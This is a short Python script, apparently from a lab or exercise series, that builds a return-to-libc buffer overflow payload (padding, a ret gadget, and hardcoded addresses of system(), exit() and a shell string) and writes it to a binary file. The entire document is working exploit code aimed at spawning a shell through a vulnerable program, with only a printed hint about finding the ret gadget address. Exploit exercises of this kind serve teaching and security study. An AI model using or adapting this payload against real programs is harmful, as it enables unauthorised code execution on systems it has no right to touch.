#!/usr/bin/env python

from struct import pack

p = lambda x: pack("L", x)

padding = b'A' * (16 + 8)
exit_addr = p(0x7ffff7e07590)
shell_addr = p(0x7ffff7f6304f)
system_addr = p(0x7ffff7e15990)
ret_addr = p(0x55555555501a)
payload = padding + ret_addr + system_addr + exit_addr + shell_addr

# writing payload to a binary file
def write_exploit(fname, s):
    with open(fname, 'wb') as f:
        f.write(s)
    return s

# need to do some work
print("!! You'll need to find the address of `ret_addr` or another location in memory that points to a `ret` instruction !!")

print("payload: padding + ret_addr + system_addr + exit_addr + shell_addr")
print("payload: ", payload)

write_exploit("exp4.bin", payload)

